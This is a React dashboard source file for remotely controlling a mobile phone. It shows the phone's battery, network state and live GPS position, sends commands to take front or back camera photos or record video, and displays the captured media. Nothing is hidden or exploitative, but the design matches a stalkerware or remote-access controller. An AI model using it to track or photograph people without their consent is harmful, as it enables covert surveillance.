import React, { useState, useEffect, useCallback } from 'react';
import { io } from 'socket.io-client';
import { MapContainer, TileLayer, Marker, Popup, useMap } from 'react-leaflet';
import L from 'leaflet';
import 'leaflet/dist/leaflet.css';
import {
  Battery, Wifi, Clock, MapPin, Camera, Video, ArrowUpRight, Plus, Activity
} from 'lucide-react';

const SERVER_URL = 'http://localhost:3000';
const socket = io(SERVER_URL);

// Marker fix
delete L.Icon.Default.prototype._getIconUrl;
L.Icon.Default.mergeOptions({
  iconRetinaUrl: 'https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/images/marker-icon-2x.png',
  iconUrl: 'https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/images/marker-icon.png',
  shadowUrl: 'https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/images/marker-shadow.png',
});

// Minimal Custom Marker
const phoneIcon = new L.DivIcon({
  className: '',
  html: `<div style="width: 20px; height: 20px; background: #fff; border-radius: 50%; border: 4px solid #000; box-shadow: 0 0 20px rgba(255,255,255,0.4);"></div>`,
  iconSize: [20, 20],
  iconAnchor: [10, 10],
});

function MapUpdater({ center }) {
  const map = useMap();
  useEffect(() => {
    if (center && center[0] !== 0) {
      map.setView(center, map.getZoom());
    }
  }, [center, map]);
  return null;
}

function App() {
  const [status, setStatus] = useState({
    batteryLevel: null,
    isCharging: false,
    networkState: 'disconnected',
    uptime: null,
    lastUpdated: null,
    location: { latitude: 13.7563, longitude: 100.5018 },
  });
  const [isConnected, setIsConnected] = useState(false);
  const [mediaList, setMediaList] = useState([]);
  const [toasts, setToasts] = useState([]);

  const addToast = useCallback((message) => {
    const id = Date.now();
    setToasts(prev => [...prev, { id, message }]);
    setTimeout(() => setToasts(prev => prev.filter(t => t.id !== id)), 3000);
  }, []);

  useEffect(() => {
    socket.on('connect', () => setIsConnected(true));
    socket.on('disconnect', () => setIsConnected(false));
    socket.on('status-update', (data) => data && setStatus(data));
    socket.on('media-list', (list) => list && setMediaList(list));
    socket.on('new-media', (item) => {
      setMediaList(prev => [item, ...prev]);
      addToast(`New ${item.type} saved`);
    });
    return () => {
      socket.off('connect');
      socket.off('disconnect');
      socket.off('status-update');
      socket.off('media-list');
      socket.off('new-media');
    };
  }, [addToast]);

  const sendCommand = (type, direction) => {
    socket.emit('command', { target: 'MOBILE', type, direction });
    addToast(`${type.replace('_', ' ')} sent`);
  };

  const formatUptime = (ms) => {
    if (!ms) return '0h 0m';
    const h = Math.floor(ms / 3600000);
    const m = Math.floor((ms % 3600000) / 60000);
    return `${h}h ${m}m`;
  };

  const mapCenter = [status.location?.latitude || 13.7563, status.location?.longitude || 100.5018];

  return (
    <div className="app-container">
      {/* Notifications */}
      <div className="toast-container">
        {toasts.map(t => (
          <div key={t.id} className="minimal-toast">{t.message}</div>
        ))}
      </div>

      {/* Minimal Header */}
      <header className="header">
        <div className="header-left">
          <h1>Device Control</h1>
          <p>{status.lastUpdated ? `Sync active · ${new Date(status.lastUpdated).toLocaleTimeString()}` : 'Waiting for connection...'}</p>
        </div>
        <div className={`connection-pill ${isConnected ? 'online' : 'offline'}`}>
          <span className="live-dot" /> {isConnected ? 'Live' : 'Offline'}
        </div>
      </header>

      {/* Info Row */}
      <div className="status-bar">
        <div className="status-item">
          <span className="status-label">Power</span>
          <span className="status-value">{status.batteryLevel != null ? `${Math.round(status.batteryLevel * 100)}%` : '--'}</span>
          <span style={{fontSize: '0.7rem', color: '#666', marginTop: '4px'}}>{status.isCharging ? 'Charging' : 'Battery'}</span>
        </div>
        <div className="status-item">
          <span className="status-label">Network</span>
          <span className="status-value">{status.networkState === 'connected' ? 'Connected' : 'Disconnected'}</span>
          <span style={{fontSize: '0.7rem', color: '#666', marginTop: '4px'}}>WiFi / LTE</span>
        </div>
        <div className="status-item">
          <span className="status-label">Session</span>
          <span className="status-value">{formatUptime(status.uptime)}</span>
          <span style={{fontSize: '0.7rem', color: '#666', marginTop: '4px'}}>Since boot</span>
        </div>
        <div className="status-item">
          <span className="status-label">Location</span>
          <span className="status-value">{mapCenter[0].toFixed(3)}, {mapCenter[1].toFixed(3)}</span>
          <span style={{fontSize: '0.7rem', color: '#666', marginTop: '4px'}}>Coordinates</span>
        </div>
      </div>

      {/* Main Context */}
      <main className="main-layout">
        <div className="map-panel">
          <div className="map-container">
            <MapContainer center={mapCenter} zoom={15} style={{ height: '100%', width: '100%' }} zoomControl={false}>
              <TileLayer url="https://{s}.basemaps.cartocdn.com/light_all/{z}/{x}/{y}{r}.png" />
              <Marker position={mapCenter} icon={phoneIcon} />
              <MapUpdater center={mapCenter} />
            </MapContainer>
          </div>
        </div>

        <aside className="side-panel">
          <div>
            <h2 className="panel-title">Actions</h2>
            <div className="control-group">
              <button className="minimal-btn" onClick={() => sendCommand('TAKE_PHOTO', 'front')}>
                Take Photo (Front) <Camera size={16} />
              </button>
              <button className="minimal-btn" onClick={() => sendCommand('TAKE_PHOTO', 'back')}>
                Take Photo (Back) <Camera size={16} />
              </button>
              <button className="minimal-btn" onClick={() => sendCommand('RECORD_VIDEO', 'front')}>
                Record Clip (Front) <Video size={16} />
              </button>
              <button className="minimal-btn" onClick={() => sendCommand('RECORD_VIDEO', 'back')}>
                Record Clip (Back) <Video size={16} />
              </button>
            </div>
          </div>

          <div>
            <h2 className="panel-title">System</h2>
            <div className="control-group">
              <div className="minimal-btn" style={{cursor: 'default', opacity: 0.5}}>
                Refresh Stream <Activity size={16} />
              </div>
            </div>
          </div>
        </aside>
      </main>

      {/* Media Feed */}
      <section className="gallery-section">
        <h2 className="panel-title">Media Feed</h2>
        {mediaList.length === 0 ? (
          <p style={{color: '#444', fontSize: '0.9rem', fontWeight: 300}}>Feed is empty</p>
        ) : (
          <div className="gallery-grid">
            {mediaList.map((item) => (
              <div className="media-card" key={item.id} onClick={() => window.open(SERVER_URL + item.url, '_blank')}>
                {item.type === 'video' ? (
                   <video src={SERVER_URL + item.url} className="media-preview" />
                ) : (
                   <img src={SERVER_URL + item.url} className="media-preview" alt="Device capture" />
                )}
                <div className="media-info">
                  <span className="media-type">{item.type}</span>
                  <span className="media-date">{new Date(item.timestamp).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}</span>
                </div>
              </div>
            ))}
          </div>
        )}
      </section>
    </div>
  );
}

export default App;
